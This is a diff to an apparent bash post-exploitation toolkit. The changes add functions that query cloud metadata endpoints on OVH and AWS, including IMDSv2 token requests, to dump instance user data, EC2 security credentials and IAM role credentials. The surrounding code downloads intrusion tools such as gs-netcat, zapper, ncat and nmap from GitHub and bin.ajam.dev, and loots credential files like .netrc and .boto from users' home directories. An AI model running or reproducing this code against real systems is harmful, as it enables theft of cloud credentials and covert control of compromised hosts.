@@ -32,7 +32,7 @@ CDC="\033[0;36m" # cyan
 CF="\033[2m"    # faint
 CN="\033[0m"    # none
 CW="\033[1;37m"
-
+CUL="\e[4m"
 
 ### Functions to keep in memory
 _hs_dep() {
@@ -47,8 +47,8 @@ xsu() {
     local u g h
 
     [ "$UID" -ne 0 ] && { HS_ERR "Need root"; return; }
-    u=$(id -u ${name:?}) || return
-    g=$(id -g ${name:?}) || return
+    u=$(id -u "${name:?}") || return
+    g=$(id -g "${name:?}") || return
     h="$(grep "^${name}:" /etc/passwd | cut -d: -f6)" || return
     HOME="${h:-/tmp}" "${HS_PY:-python}" -c "import os;os.setgid(${g:?});os.setuid(${u:?});os.execlp('bash', 'bash')"
 }
@@ -412,35 +412,41 @@ bin() {
         echo -e ".....[${CDG}OK${CDM}]${CN}"
     }
 
-    bin_dl gs-netcat "https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_${os,,}-${arch}"
-    bin_dl zapper    "https://github.com/hackerschoice/zapper/releases/latest/download/zapper-${os,,}-${arch}"
-    bin_dl curl      "https://bin.ajam.dev/${a}/curl"
-    bin_dl rg        "https://bin.ajam.dev/${a}/ripgrep"
-    bin_dl fd        "https://bin.ajam.dev/${a}/fd-find"
-    bin_dl anew      "https://bin.ajam.dev/${a}/anew"
-    bin_dl ping      "https://bin.ajam.dev/${a}/ping"
-    bin_dl nc        "https://bin.ajam.dev/${a}/ncat"
-    bin_dl socat     "https://bin.ajam.dev/${a}/socat"
-    bin_dl jq        "https://bin.ajam.dev/${a}/jq"
-    bin_dl reptyr    "https://bin.ajam.dev/${a}/reptyr"
-    bin_dl netstat   "https://bin.ajam.dev/${a}/netstat"
-    bin_dl rsync     "https://bin.ajam.dev/${a}/rsync"
-    bin_dl strace    "https://bin.ajam.dev/${a}/strace"
-    bin_dl script    "https://bin.ajam.dev/${a}/Baseutils/util-linux/script"
-    bin_dl awk       "https://bin.ajam.dev/${a}/Baseutils/gawk/gawk"
-    # bin_dl awk       "https://bin.ajam.dev/${a}/awk"
-    bin_dl base64    "https://bin.ajam.dev/${a}/Baseutils/coreutils/base64"
-    bin_dl gzip      "https://bin.ajam.dev/${a}/Baseutils/gzip/gzip"
-    bin_dl hexdump   "https://bin.ajam.dev/${a}/Baseutils/util-linux/hexdump"
-    bin_dl zgrep     "https://bin.ajam.dev/${a}/Baseutils/gzip/zgrep"
-    bin_dl grep      "https://bin.ajam.dev/${a}/Baseutils/grep"
-    bin_dl tar       "https://bin.ajam.dev/${a}/Baseutils/tar/tar"
-    bin_dl sed       "https://bin.ajam.dev/${a}/Baseutils/sed"
-    bin_dl nmap      "https://bin.ajam.dev/${a}/nmap"
-    bin_dl tcpdump   "https://bin.ajam.dev/${a}/tcpdump"
-    bin_dl openssl   "https://bin.ajam.dev/${a}/Baseutils/openssl/openssl"
-    bin_dl busybox   "https://bin.ajam.dev/${a}/Baseutils/busybox/busybox"
-    [ "$arch" = "x86_64" ] && bin_dl noseyparker "https://github.com/hackerschoice/binary/raw/main/tools/noseyparker-x86_64-static"
+    bin_dl anew         "https://bin.ajam.dev/${a}/anew-rs"
+    bin_dl awk          "https://bin.ajam.dev/${a}/Baseutils/gawk/gawk"
+    # bin_dl awk          "https://bin.ajam.dev/${a}/awk"
+    bin_dl base64       "https://bin.ajam.dev/${a}/Baseutils/coreutils/base64"
+    bin_dl busybox      "https://bin.ajam.dev/${a}/Baseutils/busybox/busybox"
+    bin_dl curl         "https://bin.ajam.dev/${a}/curl"
+    bin_dl fd           "https://bin.ajam.dev/${a}/fd-find"
+
+    bin_dl gs-netcat    "https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_${os,,}-${arch}"
+    # bin_dl gs-netcat    "https://bin.ajam.dev/${a}/gs-netcat" #fetched straight from https://github.com/hackerschoice/gsocket (avoid GH ratelimit)
+    bin_dl grep         "https://bin.ajam.dev/${a}/Baseutils/grep/grep"
+    bin_dl gzip         "https://bin.ajam.dev/${a}/Baseutils/gzip/gzip"
+    bin_dl hexdump      "https://bin.ajam.dev/${a}/Baseutils/util-linux/hexdump"
+    bin_dl jq           "https://bin.ajam.dev/${a}/jq"
+    bin_dl nc           "https://bin.ajam.dev/${a}/ncat"
+    # bin_dl nc           "https://bin.ajam.dev/${a}/Baseutils/netcat/netcat" #: https://www.libressl.org/
+    bin_dl netstat      "https://bin.ajam.dev/${a}/Baseutils/nettools/netstat"
+    bin_dl nmap         "https://bin.ajam.dev/${a}/nmap"
+    bin_dl noseyparker  "https://bin.ajam.dev/${a}/noseyparker"
+    # [ "$arch" = "x86_64" ] && bin_dl noseyparker "https://github.com/hackerschoice/binary/raw/main/tools/noseyparker-x86_64-static"
+    bin_dl openssl      "https://bin.ajam.dev/${a}/Baseutils/openssl/openssl"
+    bin_dl ping         "https://bin.ajam.dev/${a}/Baseutils/iputils/ping"
+    bin_dl ps           "https://bin.ajam.dev/${a}/Baseutils/procps/ps"
+    bin_dl reptyr       "https://bin.ajam.dev/${a}/reptyr"
+    bin_dl rg           "https://bin.ajam.dev/${a}/ripgrep"
+    bin_dl rsync        "https://bin.ajam.dev/${a}/rsync"
+    bin_dl script       "https://bin.ajam.dev/${a}/Baseutils/util-linux/script"
+    bin_dl sed          "https://bin.ajam.dev/${a}/Baseutils/sed"
+    bin_dl socat        "https://bin.ajam.dev/${a}/socat"
+    bin_dl strace       "https://bin.ajam.dev/${a}/strace"
+    bin_dl tar          "https://bin.ajam.dev/${a}/Baseutils/tar/tar"
+    bin_dl tcpdump      "https://bin.ajam.dev/${a}/tcpdump"
+    bin_dl zapper       "https://github.com/hackerschoice/zapper/releases/latest/download/zapper-${os,,}-${arch}"
+    # bin_dl zapper       "https://bin.ajam.dev/${a}/zapper" #built from src @2-3 days
+    bin_dl zgrep        "https://bin.ajam.dev/${a}/Baseutils/gzip/zgrep"
 
     [ -n "$single" ] && [ -z "$_HS_SINGLE_MATCH" ] && {
         local str="${single##*/}"
@@ -494,6 +500,71 @@ _loot_homes() {
         cat "$fn"
         echo -en "${CN}"
     done
+}
+
+_loot_ovh() {
+    local str
+
+    [ -n "$_HS_NOT_OVH" ] && return
+    [ -n "$_HS_NO_SSRF" ] && return
+
+    str="$(timeout -s SIGKILL 4 "${DL[@]}" "http://169.254.169.254/openstack/latest/user_data" 2>/dev/null)" || {
+        [ "$?" -eq 124 ] && _HS_NO_SSRF=1
+        unset str
+    }
+    [ -z "$str" ] && {
+        _HS_NOT_OVH=1
+        return 255
+    }
+    echo -e "${CB}OVH user_data${CDY}${CF}"
+    echo "$str"
+    echo -en "${CN}"
+    echo -e "${CW}TIP: ${CDC}"'"${DL[@]}" "http://169.254.169.254/openstack/latest/meta_data.json" | jq -r'"${CN}"
+}
+
+# FIXME: Search through environment variables of all running processes.
+_loot_aws() {
+    local str
+    local TOKEN
+    local role
+
+    [ -n "$_HS_NOT_AWS" ] && return
+    [ -n "$_HS_NO_SSRF" ] && return
+
+    command -v curl >/dev/null || return # AWS always has curl
+
+    str="$(timeout -s SIGKILL 4 curl -SsfL -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60" 2>/dev/null)" || {
+        [ "$?" -eq 124 ] && _HS_NO_SSRF=1
+        unset str
+    }
+    [ -z "$str" ] && {
+        _HS_NOT_AWS=1
+        return 255
+    }
+    TOKEN="$str"
+
+    str="$(curl -SsfL -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/user-data)"
+    [[ "$str" != *Lightsail* ]] && {
+        echo -e "${CB}AWS user_data${CDY}${CF}"
+        echo "$str"
+        echo -en "${CN}"
+    }
+
+    str="$(curl -SsfL -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance)" || unset str
+    [ -n "$str" ] && {
+        echo -e "${CB}AWS EC2 Security Credentials${CDY}${CF}"
+        echo "$str"
+        echo -en "${CN}"
+    }
+
+    str="$(curl -SsfL -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)" || unset str
+    [ -n "$str" ] && {
+        for role in $str; do
+            echo -e "${CB}AWS IAM Role${CDY} ${role}${CF}"
+            curl -SsfL -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role"
+            echo -e "${CN}"
+        done
+    }
 }
 
 lootlight() {
@@ -582,6 +653,14 @@ loot() {
     _loot_homes "AWS S3" ".passwd-s3fs"
     _loot_homes "AWS S3" ".boto"
     _loot_homes "NETRC"  ".netrc"
+
+    # SSRF
+    _loot_ovh
+    [ -z "$_HS_NOT_OVH" ] && _loot_aws
+    [ -z "$_HS_NO_SSRF" ] && {
+        # Found an SSRF
+        echo -e "${CW}TIP:${CN} See ${CB}${CUL}https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf${CN}"
+    }
 
     lootlight
 }
@@ -682,15 +761,19 @@ hs_init_dl() {
             [ -n "$UNSAFE" ] && opts=("-k")
             curl -fsSL "${opts[@]}" --connect-timeout 7 --retry 3 "${1:?}"
         }
+        DL=("curl" "-fsSL" "${opts[@]}" "--connect-timeout" "7" "--retry" "3")
     elif command -v wget >/dev/null; then
         _HS_SSL_ERR="is not trusted"
         dl() {
             local opts=()
             [ -n "$UNSAFE" ] && opts=("--no-check-certificate")
+            # Can not use '-q' here because that also silences SSL/Cert errors
             wget -O- "${opts[@]}" --connect-timeout=7 --dns-timeout=7 "${1:?}"
         }
+        DL=("wget" "-q" "-O-" "${opts[@]}" "--connect-timeout=7" "--dns-timeout=7")
     else
         dl() { HS_ERR "Not found: curl, wget"; }
+        DL=("false")
     fi
 }
 
